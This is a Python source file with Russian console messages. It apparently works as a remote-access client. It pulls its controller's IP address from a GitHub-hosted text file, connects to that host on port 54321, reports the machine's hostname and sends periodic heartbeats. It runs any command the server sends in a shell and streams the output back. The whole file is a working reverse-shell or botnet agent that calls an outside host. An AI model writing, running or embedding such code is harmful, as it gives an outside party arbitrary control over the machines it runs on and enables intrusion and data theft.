import socket
import subprocess
import select
import requests
import time

PORT = 54321


def get_init_str():
    hostname = socket.gethostname()
    return f"type: init, payload: {hostname}\n"


def send_init(sock):
    msg = get_init_str()
    sock.sendall(msg.encode())
    print(f"отправлен init: {msg.strip()}")


def send_done_payload(proc, sock):
    for line in proc.stdout:
        line = line.rstrip("\n")
        print(line)

        out = f"type: client_line, payload: {line}\n"
        sock.sendall(out.encode())


def do_payload(command, sock):
    try:
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )

        send_done_payload(proc, sock)
        proc.wait()

    except Exception as e:
        print("ошибка выполнения:", e)


def handle_response(buffer, sock):
    print("ответ сервера:", buffer.strip())

    if "ok" in buffer:
        print("сервер подтвердил соединение")

    elif "message" in buffer:
        print("получено сообщение от сервера")

        if "payload:" in buffer:
            payload = buffer.split("payload:", 1)[1].strip()
            do_payload(payload, sock)
        else:
            print("payload не найден")

    elif "unknown" in buffer:
        print("сервер не понял сообщение")

    else:
        print("неизвестный тип ответа")


def run_client(sock):
    print("клиент запущен")

    send_init(sock)

    while True:
        readable, _, _ = select.select([sock], [], [], 30)

        if readable:
            data = sock.recv(1024)
            if not data:
                print("сервер отключился")
                break

            buffer = data.decode()
            handle_response(buffer, sock)

        else:
            print("отправка heartbeat...")
            send_init(sock)


def get_ip():
    url = "https://raw.githubusercontent.com/PusTrace/utils/refs/heads/master/ifconfig.txt"
    response = requests.get(url, allow_redirects=True)
    text = response.text
    return text.strip()


def main():
    while True:
        try:
            ip = get_ip()
        except Exception as e:
            time.sleep(5)
            continue
        print(ip)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, PORT))
        except Exception as e:
            print("ошибка подключения:", e)
            time.sleep(2 * 60)
            continue

        run_client(sock)
        sock.close()


if __name__ == "__main__":
    main()
